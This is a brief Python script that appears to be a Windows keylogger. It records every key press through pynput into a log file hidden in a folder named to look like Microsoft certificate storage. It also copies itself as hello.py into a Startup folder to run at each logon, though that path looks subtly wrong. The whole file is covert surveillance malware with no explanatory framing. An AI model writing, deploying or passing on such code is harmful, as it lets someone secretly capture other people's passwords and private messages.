from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_directory = f"C:/Users/{username}/AppData/Roaming/Microsoft/SystemCertificates/My"

copyfile('hello.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/hello.py')

logging.basicConfig(filename=f"{logging_directory}/log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(f'Key pressed: {key}')

with Listener(on_press=key_handler) as listener:
    listener.join()
